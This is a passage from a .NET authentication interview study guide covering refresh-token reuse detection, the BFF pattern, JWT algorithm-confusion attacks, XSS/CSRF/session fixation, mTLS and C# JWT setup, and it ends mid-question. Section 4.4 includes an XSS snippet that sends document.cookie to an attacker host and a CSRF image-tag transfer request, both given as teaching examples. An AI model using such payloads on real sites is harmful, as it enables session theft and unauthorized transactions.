    S-->>A: 401 Unauthorized
    Note over U,S: Legitimate user is also logged out —\ntrade-off: security over convenience
```

**Trade-off worth naming in an interview:** revoking the whole family on reuse detection means the *legitimate* user also gets logged out if their token was the one stolen — this is an intentional "fail safe" choice; the alternative (only revoking the reused token) leaves the attacker's rotated descendant token still valid, which defeats the point.

Also worth mentioning: **binding refresh tokens to device/session metadata** (IP range, user agent fingerprint) as a secondary signal — not foolproof, but raises the bar and gives you richer audit data when investigating a suspected compromise.

### 3.9 [new content] Securing SPA-to-API Auth: BFF Pattern vs Token-in-Browser

Your notes covered the "cookie for browser, header for Postman/mobile" dual-mode architecture in detail, but didn't name or contrast it against the **Backend-for-Frontend (BFF)** pattern, which is the current recommended approach (per OAuth 2.0 for Browser-Based Apps / BCP) for SPAs specifically.

**Token-in-browser (what your notes describe):** the SPA (or its supporting backend) ends up with a token that ultimately lives in the browser's reach — even if it's in an HttpOnly cookie rather than `localStorage`, the browser is still the place tokens are issued to and consumed from directly by the SPA's own origin.

**BFF pattern:** the browser never sees an OAuth token at all.

```mermaid
flowchart LR
    Browser["Browser (SPA)"] -- "Session cookie only\n(HttpOnly, Secure, SameSite)" --> BFF["BFF (your backend)"]
    BFF -- "OAuth Authorization Code + PKCE\n(server-to-server)" --> AS["Authorization Server"]
    BFF -- "Access token attached server-side" --> API["Resource API"]
```

- The SPA talks only to its own backend (the BFF) using a plain session cookie — no JWT, no OAuth token ever reaches JavaScript.
- The BFF performs the OAuth/OIDC dance itself (it's a confidential client, holds real secrets, can be trusted with tokens) and attaches the access token when calling downstream APIs.
- This eliminates the entire "where do I safely store a token in the browser" problem, because the answer becomes "nowhere — the browser never has one."

| | Token-in-browser (cookie or header) | BFF pattern |
|---|---|---|
| XSS blast radius | Attacker can still ride the session (CSRF-style) even with HttpOnly cookies, or steal the token outright with `localStorage` | Attacker can ride the session cookie but never obtains a portable bearer token |
| Complexity | Lower — SPA talks directly to API/auth server | Higher — extra backend component to build/operate |
| Mobile/Postman support | Natural fit (bearer header) | Requires a different flow (native apps typically don't need a BFF the same way) |
| Token exposure surface | Browser is part of the trust boundary for the token | Browser is never part of the token's trust boundary |
| Recommended by | — | OAuth 2.0 Security Best Current Practice for browser-based apps |

**Interview framing:** the dual-cookie/header approach your notes describe is a *pragmatic* solution that many real systems ship — it's not wrong, but a senior answer should recognize it still puts a real bearer token inside the browser's origin, and name the BFF pattern as the more defense-in-depth alternative when you control both the SPA and its backend.

### 3.10 [new content] ASP.NET Core Identity Customization

Not present in the source notes at all, but ASP.NET Core Identity customization is a near-certain topic once JWT/OAuth basics are covered, since most real .NET systems layer custom auth on top of Identity rather than replacing it outright.

Common customization points senior engineers are expected to know:

- **Custom `IdentityUser`**: extend with additional properties (`TenantId`, `DisplayName`, `IsActive`) via `public class AppUser : IdentityUser<Guid> { ... }`, and a matching custom `IdentityDbContext<AppUser, AppRole, Guid>`.
- **Custom password/username validators**: implement `IPasswordValidator<TUser>` / `IUserValidator<TUser>` for org-specific policy (e.g., disallow reused passwords, enforce corporate complexity rules beyond the built-in options).
- **Custom claims principal factory**: override `UserClaimsPrincipalFactory<TUser>` to inject additional claims (tenant, feature flags, department) into the cookie/JWT-backed principal at sign-in time, rather than querying them per-request.
- **Replacing the token provider**: Identity's default is cookie-based; when Identity is the source of truth for users/roles but you need JWTs for an API, you typically use Identity purely for user/credential management (`SignInManager`, `UserManager`) and issue your own JWTs from a custom endpoint (exactly the pattern in your source's `JwtTokenService` example) rather than relying on Identity's cookie auth for API calls.
- **`AddIdentityCore<TUser>()` vs `AddIdentity<TUser,TRole>()`**: for API-only backends you usually want `AddIdentityCore` — it skips the cookie-auth/UI scaffolding (`SignInManager`'s external cookie schemes, etc.) that full `AddIdentity` wires up by default, giving you just user/role/password management plus the ability to add JWT bearer auth on top.
- **Custom stores**: implementing `IUserStore<TUser>` directly (bypassing EF Core) when users live in an external system (e.g., a legacy identity DB, or Azure AD as the store) — rare but a real senior-level scenario.

```csharp
// API-only Identity setup — no cookie/UI scaffolding
builder.Services.AddIdentityCore<AppUser>(options =>
    {
        options.Password.RequiredLength = 12;
        options.User.RequireUniqueEmail = true;
    })
    .AddRoles<AppRole>()
    .AddEntityFrameworkStores<AppDbContext>()
    .AddDefaultTokenProviders();

builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(/* ... */);
```

**Interviewer follow-up:** *"Why not just use Identity's built-in cookie auth for your API?"* — Cookie auth is inherently browser/session-oriented and doesn't naturally serve non-browser clients (mobile, service-to-service, third-party integrations) or scale statelessly across services the way a signed JWT does; Identity remains the right tool for user/credential/role *management*, while JWT issuance/validation handles the actual API authentication concern.

### 3.11 [new content] Multi-Tenant Authentication & Authorization

Also absent from the source notes, but extremely common in senior SaaS interviews.

Key design questions an interviewer will probe:

1. **Where does tenant identity live?**
   - As a claim in the token (`tenantId` claim) — simplest, but means tenant changes require re-issuing tokens (or a version-check pattern, same trade-off as role changes discussed in [4.1](#41-why-jwt-revocation-is-hard--and-the-real-strategies)).
   - Derived from the request (subdomain, custom header, route segment) and cross-checked against the user's allowed tenants — more flexible, adds a lookup per request.
2. **Single vs multiple identity providers per tenant:**
   - Shared IdP, tenant claim inside the token (common for B2C-style SaaS where you own the IdP).
   - Per-tenant IdP (each enterprise customer brings their own Azure AD/Okta tenant) — requires **dynamic issuer validation**: your `TokenValidationParameters.ValidIssuers` (or a custom `IssuerValidator` delegate) must resolve the expected issuer per tenant rather than a single hard-coded value.
3. **Cross-tenant leakage is the #1 real-world bug class**: every data query must be scoped by tenant, and it's dangerous to rely on the JWT's `tenantId` claim alone without also enforcing it at the data-access layer (defense in depth — global query filters in EF Core are a common mitigation).
4. **Token audience/issuer per tenant:** if using an app-per-tenant Azure AD/Entra external ID model, `aud`/`iss` validation must be tenant-aware rather than a single static string.

```csharp
options.TokenValidationParameters = new TokenValidationParameters
{
    ValidateIssuer = true,
    IssuerValidator = (issuer, token, parameters) =>
    {
        // Resolve allowed issuer dynamically per tenant, e.g. from a cache of known tenant IdPs
        return _tenantIssuerResolver.IsKnownIssuer(issuer) ? issuer
            : throw new SecurityTokenInvalidIssuerException("Unknown tenant issuer");
    },
    ValidateAudience = true,
    // ...
};
```

**Interview framing:** the hard part of multi-tenant auth is almost never the token validation itself — it's making sure tenant scoping is enforced *consistently* at every layer (token claim → middleware → data access), because a single missed filter is a cross-tenant data leak.

---

## 4. Security & Performance

### 4.1 Why JWT Revocation Is Hard — and the Real Strategies

Because a JWT is self-contained and (by default) not checked against server state, once issued it remains valid until `exp` — even if the user logs out, gets deactivated, or the token is stolen.

**A) Very short access token lifetime (5–15 min)** — the most common and usually sufficient approach. Revoke the *refresh* token and wait out the short access-token window.

**B) Revocation list / blacklist by `jti`** — store revoked token IDs until they'd naturally expire; every request checks storage. Reintroduces state and a lookup cost, partially defeating JWT's statelessness benefit — use only for high-value scenarios (e.g. immediate termination requirements).

**C) Token versioning ("session version")** — store a `userTokenVersion` in the DB, embed a `ver` claim in the JWT, reject on mismatch. Still requires a DB/Redis check per request — again, reintroducing state.

**D) Opaque tokens + introspection** — token is a random string; the API calls the auth server to validate it on every use. Fully revocable, but adds a network hop per request (see [4.2](#42-new-content-opaque-tokens-vs-jwt-for-revocation--the-real-trade-off) for the full trade-off analysis).

**One-liner:** JWT revocation is achieved via short expiry, refresh-token revocation, token blacklisting (by `jti`), or signing-key rotation — there's no free lunch; every option trades away some of JWT's original statelessness benefit.

### 4.2 [new content] Opaque Tokens vs JWT for Revocation — the Real Trade-off

Your notes list "opaque tokens + introspection" as option D above but don't frame it as the fundamental architectural choice it actually is. This deserves to be called out as its own decision point:

| | JWT (self-contained) | Opaque token + introspection |
|---|---|---|
| Revocation | Hard — needs added state (blacklist/versioning) to be immediate | Trivial — delete/flag the record server-side, next introspection call fails |
| Per-request cost | Zero network calls — pure crypto verification | One network call to the authorization server per validation (unless cached) |
| Scalability | Excellent — any service can verify independently | Bounded by introspection endpoint's throughput; usually mitigated with short-TTL caching |
| Information disclosure | Payload is readable by anyone holding the token (unless JWE) | Nothing is disclosed — the token is meaningless outside the issuing system |
| Offline/air-gapped verification | Possible (services can verify without contacting the issuer) | Not possible — always requires a round trip |
| Typical use | Access tokens in microservice architectures where verification volume is high | Refresh tokens always; sometimes access tokens too, when immediate revocation matters more than latency (e.g., banking, high-security APIs) |

**The senior-level framing:** this isn't "JWT vs opaque" as a binary technology choice — it's a **latency vs revocability trade-off**. Systems that need instant, guaranteed revocation (financial transactions, admin sessions) should lean toward opaque + introspection (or JWT + mandatory blacklist check) despite the added hop. Systems optimizing for throughput and horizontal scale, where a 5–15 minute worst-case exposure window is acceptable, should lean toward pure stateless JWT. Many real systems land in the middle: JWT access tokens (fast path, short-lived) + opaque refresh tokens (revocable, long-lived) — which is exactly the hybrid your source notes describe throughout.

### 4.3 [new content] JWT Validation Pitfalls: Algorithm Confusion & alg:none

Your notes mention `alg: none` and "algorithm confusion" as a one-line aside ("A classic JWT vulnerability... modern libraries usually protect you, but only if configured correctly"). This is one of the highest-signal security topics in JWT interviews and deserves a full explanation, since "how would this attack actually work" is a very likely follow-up.

**`alg: none` attack:** the JWT spec technically allows an `alg` value of `none`, meaning "this token is unsigned." If a verifier naively trusts the `alg` header from the token itself and dispatches to whatever verification routine that names, an attacker can simply set `alg: none`, strip the signature, and the server accepts a token it should have rejected outright. **Fix:** never let the token dictate its own verification algorithm — pin the expected algorithm(s) explicitly in server configuration (e.g., `TokenValidationParameters.ValidAlgorithms` or equivalent), and reject anything else, including `none`, unconditionally.

**Algorithm confusion (RS256 → HS256 downgrade) attack:** this is the more dangerous variant. If a server is configured to verify RS256 tokens using a *public* key, but its JWT library will also happily verify **HS256** tokens if told to, an attacker can:
1. Take the server's public RSA key (which is, by design, publicly available — e.g., via a JWKS endpoint).
2. Craft a token with `alg: HS256` and **use the public key's raw bytes as the HMAC secret**.
3. Because the server (if misconfigured) uses the same key material lookup for both verification paths and trusts the token's own `alg` header to decide *how* to use that key, it ends up computing an HMAC with a "secret" the attacker also possesses (the public key) — and the forged signature verifies.

**Fix:** the verifier must fix the expected algorithm *and* algorithm family server-side, independent of the incoming token's header, and must never use the same key material interchangeably between symmetric and asymmetric verification paths. Modern libraries (`Microsoft.IdentityModel.Tokens` in .NET) mitigate this by default as long as you don't manually disable algorithm restriction, but it's worth explicitly stating in an interview that this is a **configuration discipline** problem, not something the library alone guarantees — always explicitly set the algorithm restriction rather than trusting defaults blindly.

```csharp
// Explicit, safe configuration — do not rely on implicit defaults
options.TokenValidationParameters = new TokenValidationParameters
{
    ValidateIssuerSigningKey = true,
    IssuerSigningKey = signingKey, // RSA public key
    ValidAlgorithms = new[] { SecurityAlgorithms.RsaSha256 }, // pin explicitly — reject HS256/none
    ValidateIssuer = true,
    ValidateAudience = true,
    ValidateLifetime = true,
    ClockSkew = TimeSpan.FromMinutes(2)
};
```

**Interviewer follow-up:** *"How would you detect this in a code review?"* — Look for any JWT verification code that reads the algorithm from the token to decide how to verify it, any code path that uses one key object for both HMAC and RSA verification, and any explicit disabling of algorithm validation "to make a library work."

### 4.4 CSRF, XSS, and Session Fixation — How They Interact With Auth

**XSS (Cross-Site Scripting)** — an attacker injects malicious JavaScript into a trusted site, which then executes in another user's browser, using *that user's* browser context to steal data/tokens or perform actions as them.

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

**CSRF (Cross-Site Request Forgery)** — a malicious site tricks a logged-in user's browser into sending an unwanted request to a trusted site. Because browsers auto-attach cookies, the target server sees what looks like a legitimate authenticated request.

```html
<!-- On evil.com, while you're logged into bank.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```
Your browser automatically attaches the `bank.com` session cookie; the bank sees a valid cookie and processes the transfer without your knowledge.

**How they interact with token storage choices:**

| Storage | XSS risk | CSRF risk | Mitigation needed |
|---|---|---|---|
| `localStorage`/`sessionStorage` | High (JS-readable) | None (not auto-attached) | Strong CSP, no unsanitized HTML injection |
| HttpOnly cookie | Low (JS can't read it) | Present (auto-attached by browser) | `SameSite=Strict/Lax` (same-site) or `SameSite=None; Secure` + CSRF token (cross-site), anti-forgery tokens |

**[new content] Session fixation** — not mentioned in the source notes at all, but a classic auth-adjacent vulnerability worth knowing cold: an attacker forces a *known* session identifier onto a victim (e.g., by sending them a link containing a pre-set session ID, or exploiting a server that accepts session IDs from the URL/query string) *before* the victim logs in. If the server doesn't issue a **fresh** session identifier upon successful authentication, the attacker's pre-known session ID becomes valid the moment the victim logs in — the attacker simply uses the same ID to ride the now-authenticated session. **Mitigation:** always regenerate the session identifier (or, in a JWT/cookie world, issue a brand-new token) immediately after a successful login, never accept a session/token identifier over the URL, and bind sessions to something the attacker can't set (server-generated, cryptographically random, HttpOnly).

**Interview-ready synthesis:** these three attacks target different layers of the same problem — XSS attacks the *storage* of credentials/tokens, CSRF attacks the *ambient trust* browsers place in cookies, and session fixation attacks the *lifecycle* of session identifiers. A robust auth design needs a mitigation for each: CSP/sanitization for XSS, SameSite + anti-forgery tokens for CSRF, and session/token regeneration on privilege change for fixation. Relying on HttpOnly cookies alone solves XSS-token-theft but explicitly reintroduces the need for CSRF protection — this is precisely the trade-off your source notes flagged in the cookie-vs-header dual-mode architecture.

### 4.5 [new content] mTLS for Service-to-Service Auth

Absent from the source notes (which mention "Mutual TLS for service identity" as a single bullet under microservices security with no explanation) — worth expanding since it's a common senior/lead follow-up on securing internal service-to-service traffic.

**Mutual TLS (mTLS):** in normal TLS, only the *server* presents a certificate and the client verifies it. In mTLS, the **client also presents a certificate**, and the server verifies it — so both sides cryptographically authenticate each other as part of the TLS handshake itself, before any application-layer request/token is even sent.

- **Why use it for service-to-service auth:** it authenticates the *calling service* at the transport layer, independent of any bearer token — useful in zero-trust internal networks (e.g., a service mesh like Istio/Linkerd) where you want every hop cryptographically verified, not just "the network is presumably private."
- **Trade-offs vs bearer tokens (JWT/OAuth client credentials):**
  - mTLS certificates need issuance/rotation infrastructure (often a service mesh sidecar handles this transparently) — heavier operational lift than rotating a client secret.
  - mTLS authenticates *the service*, not fine-grained scopes/claims about *what* it's allowed to do — you typically still layer OAuth client credentials or a custom claims model on top for authorization decisions.
  - Very common combination in practice: **mTLS for transport-level service identity + OAuth client credentials (JWT) for authorization claims** — defense in depth, not either/or.
- **.NET angle:** Kestrel supports client certificate validation (`RequireCertificate`/`AllowCertificate` in `HttpsConnectionAdapterOptions`); most production mTLS setups delegate the actual handshake/rotation to a service mesh or API gateway rather than hand-rolling certificate validation in application code.

### 4.6 [new content] API Keys vs OAuth Client Credentials for Machine-to-Machine

Also absent from the source notes, but a frequent real-world design question: "a partner wants to call our API — do we give them an API key or set up OAuth?"

| | API Key | OAuth 2.0 Client Credentials |
|---|---|---|
| What it proves | "Caller possesses this static secret" | "Caller authenticated as a specific registered client and was issued a scoped, time-limited token" |
| Expiry | Usually none (until manually rotated) | Built-in — access tokens are short-lived by design |
| Scoping | Typically all-or-nothing per key, unless you build custom scope logic | Native support for scopes per client |
| Revocation | Manual (delete/rotate the key) | Revoke at the client/token level; short expiry limits exposure automatically |
| Standardization | No standard protocol — bespoke per API | Standardized (RFC 6749) — client libraries, tooling, and audits all understand it |
| Operational simplicity | Very simple to implement and consume | More moving parts (token endpoint, JWKS, expiry handling) |
| Best for | Simple, low-risk integrations, quick partner onboarding, rate-limiting/identification more than security boundary | Any M2M scenario where you want real security guarantees, auditability, scoped/least-privilege access, and standardized tooling |

**Senior framing:** API keys are best thought of as an *identification* mechanism (which is calling me) rather than a real *authorization* mechanism (proving what they're allowed to do, with automatic expiry) — they're fine for low-stakes, low-blast-radius integrations, but for anything security-sensitive, OAuth 2.0 Client Credentials (with a private key JWT or client secret, short-lived tokens, and defined scopes) is the modern default, and it's what most cloud providers (Azure AD app registrations with client credentials flow, Auth0 M2M applications) push you toward by default.

### 4.7 Performance Considerations

- **JWT avoids a DB/session lookup per request** — this is JWT's core performance win over server-side sessions, but it's not free: verifying RS256/ES256 signatures is more CPU-intensive than HS256, and every mitigation for revocation (blacklist check, token versioning, introspection call) reintroduces some form of I/O per request, eroding that win.
- **Large token payloads increase network overhead** on every single request (unlike a session cookie, which is small and constant-size) — keep claims minimal; fetch rarely-needed user detail from an API rather than embedding it.
- **JWKS caching:** verifiers should cache the JWKS response (respecting `Cache-Control`) rather than fetching it on every request; most libraries (`Microsoft.IdentityModel.Protocols.OpenIdConnect`) do this automatically when you set `Authority`, but it's worth knowing it's happening and being tunable.
- **Introspection calls (opaque tokens)** are the single biggest latency cost of that model — mitigated with short-TTL local caching of introspection results, trading a little revocation immediacy for throughput.
- **Clock skew tolerance** should be small (1–2 minutes) — too generous a skew window quietly extends the effective validity of expired tokens; too strict causes spurious failures from minor clock drift across distributed servers.

---

## 5. Best Practices

- **Never put secrets in a JWT** — no passwords, no financial data, no PII you wouldn't want exposed if intercepted, even encrypted (assume logs/telemetry could still leak plaintext at some point in the pipeline).
- **Keep access tokens short-lived** — minutes, not hours or days.
- **Always validate `iss`/`aud`/`exp`/`nbf`** — skipping `aud` validation is a very common mistake that enables token replay across services sharing an issuer.
- **Use asymmetric signing (RS256/ES256) when multiple services validate tokens** — safer key distribution than sharing an HMAC secret everywhere.
- **Use a dedicated token-type claim** (`"typ": "access"` / `"token_use": "access"`) so a refresh token can never be replayed as an access token.
- **Prefer scopes over embedding roles directly in access tokens** when roles change frequently — role changes won't take effect until the token expires unless you add state checks; scopes describe capability at issuance time and are inherently more stable.
- **Rotate signing keys** — maintain multiple keys, use `kid`, publish public keys via JWKS, rotate periodically, keep old keys available until all tokens signed with them have expired.
- **Handle clock skew** — allow 1–2 minutes, not more.
- **Always use HTTPS** — prevents token sniffing and downgrade-based replay.
- **Never send tokens in a query string** — they leak into server logs and browser history.
- **Rotate refresh tokens on every use, and detect reuse** (see [3.8](#38-new-content-refresh-token-rotation--reuse-detection)).
- **Revoke on logout and credential/password change**, not just on explicit "revoke" action.
- **Rate-limit the refresh/token endpoint** — it's a high-value target for brute force and abuse.
- **Prefer policy-based authorization over scattered role checks** for anything beyond trivial apps — centralizes and makes auditable the actual access-control logic.
- **Store secrets (signing keys, client secrets) in a managed secret store** (Azure Key Vault, AWS Secrets Manager) — never in `appsettings.json` committed to source control.

---

## 6. Common Pitfalls

### 6.1 JWT Pitfalls

| # | Pitfall | Impact | Best Practice |
|---|---|---|---|
| 1 | Long token expiry | Stolen tokens remain valid for a long window; no immediate revocation | Access token expiry 5–30 minutes; use refresh tokens |
| 2 | No revocation strategy | Logout doesn't immediately invalidate access | Blacklist (Redis), refresh-token revocation, short lifetime |
| 3 | Insecure storage (`localStorage`) | XSS can steal the token wholesale | HttpOnly Secure cookies, or BFF pattern |
| 4 | Large payloads | Network overhead, slower requests | Keep only essential claims; fetch extra data from an API |
| 5 | Skipping validation checks (issuer/audience/expiry) | Accepts forged/expired/misdirected tokens | Always validate `iss`, `aud`, `exp`, `nbf`, signature |
| 6 | Weak signing keys | Tokens can be forged | Strong secrets or RSA/ECDSA keys; rotate regularly |
| 7 | Clock skew misconfiguration | Random, hard-to-reproduce auth failures | Minimal skew tolerance (1–2 minutes) |
| 8 | Sending JWT in query string | Token leaks via logs/browser history | Always use the `Authorization` header |
| 9 | No HTTPS enforcement | Tokens interceptable, enables replay | Enforce HTTPS everywhere |
| 10 | Assuming JWT is encrypted | Payload is readable by anyone holding the token | Treat as public — never embed secrets |

### 6.2 OAuth Pitfalls

| # | Pitfall | Impact | Best Practice |
|---|---|---|---|
| 1 | Using implicit flow for SPAs | Token leakage risk (exposed in URL/history) | Authorization Code + PKCE |
| 2 | Improper/wildcard redirect URI validation | Token/code hijacking | Strict, exact redirect URI allow-listing |
| 3 | Storing client secrets in frontend code | Anyone can impersonate the client | Never embed secrets in JS/mobile bundles; use PKCE for public clients |
| 4 | Over-permissioned scopes | Excessive access if token leaks | Least-privilege scopes |
| 5 | Missing token validation in the API | Unauthorized access via blind trust | Always validate issuer, audience, expiry, signature |
| 6 | No refresh token rotation | Enables replay attacks | Rotate on every use |
| 7 | Poor revocation strategy | Stolen refresh tokens remain valid indefinitely | Maintain a revocation mechanism |
| 8 | Confusing OAuth with authentication | Wrong implementation assumptions, missing identity guarantees | Use OpenID Connect for authentication, OAuth for delegated authorization |

### 6.3 Refresh Token Pitfalls

| # | Pitfall | Impact | Best Practice |
|---|---|---|---|
| 1 | Insecure storage (localStorage/sessionStorage/plain cookie) | XSS-driven account takeover | HttpOnly Secure cookies; encrypt at rest if stored server-side |
| 2 | No rotation | Stolen token grants indefinite access-token minting | Rotate on every refresh |
| 3 | Long expiry (months) | Wide attack window if compromised | 7–30 days typical; force periodic re-login |
| 4 | Not bound to user/device | Token replay from an attacker's device | Bind to device fingerprint/session id where feasible |
| 5 | No revocation on logout/password change | Token remains valid post-logout | Explicitly revoke on both events |
| 6 | Unlimited active tokens per user | Hard to track compromise; session sprawl | Cap active sessions; maintain a token inventory |
| 7 | No replay detection | Silent, ongoing account compromise | Detect reuse of a rotated token; revoke the whole family (see [3.8](#38-new-content-refresh-token-rotation--reuse-detection)) |
| 8 | Refresh endpoint not rate-limited | Brute-force/guessing exposure | Rate limit and monitor |
| 9 | Sent via query string | Leaks through logs/browser history | Body or secure cookie only |
| 10 | No audit logging of refresh activity | Attacks go unnoticed | Log and monitor for anomalies |

---

## 7. Implementation Reference (C#)

Minimal, idiomatic JWT bearer setup for .NET 8 (consolidated from source examples — secrets shown inline for illustration only; **use a managed secret store in production**).

**`appsettings.json`:**
```json
{
  "Jwt": {
    "Key": "SUPER_SECRET_KEY_12345",
    "Issuer": "MyCompany.Auth",
    "Audience": "MyCompany.Api",
    "ExpiryMinutes": 30
  }
}
```

**`Program.cs`:**
```csharp
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.IdentityModel.Tokens;
using System.Text;

var builder = WebApplication.CreateBuilder(args);

var jwtSettings = builder.Configuration.GetSection("Jwt");
var key = Encoding.UTF8.GetBytes(jwtSettings["Key"]!);

builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = jwtSettings["Issuer"],
            ValidAudience = jwtSettings["Audience"],
            IssuerSigningKey = new SymmetricSecurityKey(key),
            ClockSkew = TimeSpan.FromMinutes(2) // small, deliberate skew — not TimeSpan.Zero in most real systems
        };
    });

builder.Services.AddAuthorization();
builder.Services.AddControllers();

var app = builder.Build();

app.UseAuthentication();
app.UseAuthorization();

app.MapControllers();
app.Run();
```

**Token generator service:**
```csharp
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;

public class JwtTokenService
{
    private readonly IConfiguration _config;

    public JwtTokenService(IConfiguration config) => _config = config;

    public string GenerateToken(string userId, string email, string role)
    {
        var jwtSettings = _config.GetSection("Jwt");
        var key = Encoding.UTF8.GetBytes(jwtSettings["Key"]!);

        var claims = new List<Claim>
        {
            new(JwtRegisteredClaimNames.Sub, userId),
            new(ClaimTypes.Email, email),
            new(ClaimTypes.Role, role),
            new("token_use", "access") // dedicated type claim — prevents refresh/access confusion
        };

        var credentials = new SigningCredentials(
            new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256);

        var token = new JwtSecurityToken(
            issuer: jwtSettings["Issuer"],
            audience: jwtSettings["Audience"],
            claims: claims,
            expires: DateTime.UtcNow.AddMinutes(int.Parse(jwtSettings["ExpiryMinutes"]!)),
            signingCredentials: credentials);

        return new JwtSecurityTokenHandler().WriteToken(token);
    }
}
```

**Dual-mode auth: cookie for browsers, header for Postman/mobile.** This solves a real constraint your notes call out explicitly: HttpOnly cookies (the right choice for browser XSS protection) are invisible to non-browser clients like Postman or native mobile apps, which naturally use the `Authorization` header instead. Supporting both from one backend:

```csharp
[HttpPost("login")]
public IActionResult Login(LoginRequest request)
{
    if (!IsValidUser(request)) return Unauthorized();

    var token = _tokenService.GenerateToken("1", "admin@test.com", "Admin");

    // Browser support
    Response.Cookies.Append("access_token", token, new CookieOptions
    {
        HttpOnly = true,
        Secure = true,
        SameSite = SameSiteMode.Strict,
        Expires = DateTime.UtcNow.AddMinutes(30)
    });

    // Postman/mobile support
    return Ok(new { access_token = token });
}
```

```csharp
.AddJwtBearer(options =>
{
    options.Events = new JwtBearerEvents
    {
        OnMessageReceived = context =>
        {
            // Priority 1: Authorization header (Postman/mobile)
            var authHeader = context.Request.Headers["Authorization"].FirstOrDefault();
            if (!string.IsNullOrEmpty(authHeader) && authHeader.StartsWith("Bearer "))
            {
                context.Token = authHeader["Bearer ".Length..];
            }
            // Priority 2: cookie (browser)
            else if (context.Request.Cookies.TryGetValue("access_token", out var cookieToken))
            {
                context.Token = cookieToken;
            }
            return Task.CompletedTask;
        }
    };
});
```

Controllers need no special handling either way:
```csharp
[Authorize]
[HttpGet("orders")]
public IActionResult GetOrders() => Ok("Secure Data");
```

**Production settings checklist (from source notes):**
- HTTPS always enforced.
- CORS configured to allow credentials for the browser cookie flow.
- `SameSite`: `Strict`/`Lax` for same-domain; `None; Secure` for cross-domain SPA scenarios.
- CSRF protection required whenever cookies are in play.
- Access token expiry 10–30 minutes; refresh token for seamless re-auth.

**Refresh endpoint (concept, with rotation):**
```csharp
[HttpPost("refresh")]
public IActionResult RefreshToken(RefreshRequest request)
{
    var savedToken = _refreshTokenStore.Get(request.RefreshToken);

    if (savedToken is null || savedToken.IsExpired || savedToken.IsConsumed)
    {
        // IsConsumed = true → reuse of an already-rotated token: possible theft.
        if (savedToken?.IsConsumed == true)
            _refreshTokenStore.RevokeFamily(savedToken.FamilyId);
        return Unauthorized();
    }

    var newAccessToken = _jwtService.GenerateToken(savedToken.UserId, savedToken.Email, savedToken.Role);
    var newRefreshToken = Guid.NewGuid().ToString();

    _refreshTokenStore.MarkConsumedAndIssueNext(request.RefreshToken, newRefreshToken);

    return Ok(new { accessToken = newAccessToken, refreshToken = newRefreshToken });
}
```

**Policy-based authorization:**
```csharp
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("ITOnly", policy => policy.RequireClaim("Department", "IT"));
});

[Authorize(Policy = "ITOnly")]
public IActionResult InternalData() => Ok();
```

---

## 8. Sample Interview Q&A

**Q1. How does JWT validation work internally?**
Extract the token from the `Authorization` header (or cookie). Select the correct key (by `kid` from a trusted JWKS if asymmetric). Verify the signature using a *server-configured* algorithm (never the token's own `alg` claim). Validate `exp`, `nbf`, `iss`, `aud` with small clock-skew tolerance. Extract claims into `HttpContext.User`. Only then does the authorization stage evaluate roles/policies. Reject on any failure.

**Q2. Difference between Authentication and Authorization?**
Authentication answers "who are you" (the login process; JWT/cookie validates identity). Authorization answers "what can you do" (claims/roles/policies validate access to a specific resource). Failure modes differ too: authentication failure → 401; authorization failure → 403.

**Q3. Why is Basic Authentication insecure?**
Credentials travel on every request, Base64 is encoding not encryption, there's no expiration or revocation, and a captured request can be replayed. It's still used in legacy/internal systems purely for compatibility, always mandatorily over HTTPS.

**Q4. How do you revoke JWT tokens?**
JWT is stateless, so revocation isn't native — you add state: short-lived access tokens (primary strategy), a `jti` blacklist in Redis, token versioning, refresh-token revocation, or signing-key rotation as a nuclear option. Each reintroduces some server-side state/lookup, which is the fundamental trade-off against JWT's original statelessness.

**Q5. Difference between JWT and OAuth?**
JWT is a token *format*; OAuth 2.0 is an *authorization framework* for how a client obtains and uses tokens to access resources on a user's behalf. OAuth commonly uses JWT as its access/ID token format, but they solve different problems and aren't interchangeable concepts.

**Q6. When should you use Windows Authentication?**
Internal enterprise apps within an Active Directory domain needing SSO; not suitable for public internet-facing APIs (no cross-domain/external client support, ties you to Kerberos/NTLM infrastructure).

**Q7. How do you secure microservices communication?**
JWT between services (often with a service-specific `aud`), mutual TLS for transport-level service identity, API gateway-level validation, and network isolation — typically combined (mTLS + JWT), not either/or (see [4.5](#45-new-content-mtls-for-service-to-service-auth)).

**Q8. Claims vs Roles — which is better?**
Claims provide fine-grained, scalable access control; roles are coarse and tend to multiply combinatorially as requirements narrow. In production, policy-based authorization built from claims (and roles where appropriate) is the recommended default because it centralizes decision logic.

**Q9. How do you handle token expiration?**
Short-lived access tokens, a refresh-token flow to obtain new ones, and silent refresh on the frontend (interceptor pattern) so the user experience isn't interrupted by re-login.

**Q10. How do you prevent token replay attacks?**
HTTPS everywhere, short token lifetime, secret/key rotation, device binding where feasible, and nonce/idempotency-key tracking for critical operations (payments, state-changing actions) regardless of token validity.

**Q11. [new content] Why is PKCE now recommended even for confidential clients, not just public ones like SPAs?**
PKCE was designed to protect public clients that can't hold a secret, but it also defends against authorization-code interception at the redirect step regardless of client type, and using it universally simplifies configuration guidance ("always use PKCE" vs a conditional rule), with no real operational cost. See [3.3](#33-pkce--why-its-now-mandatory-even-for-confidential-clients).

**Q12. [new content] Walk me through an algorithm confusion attack on JWT.**
If a server verifies RS256 tokens with a public key but its library also accepts HS256 using the same key-lookup path, an attacker can craft an HS256 token and use the (publicly available) RSA public key bytes as the HMAC secret — producing a signature the server incorrectly accepts. Mitigation: pin the expected algorithm(s) server-side, never trust the token's own `alg` header, never share key material across symmetric/asymmetric verification paths. See [4.3](#43-new-content-jwt-validation-pitfalls-algorithm-confusion--algnone).

**Q13. [new content] What's the BFF pattern and why would you use it over a token-in-browser approach for a SPA?**
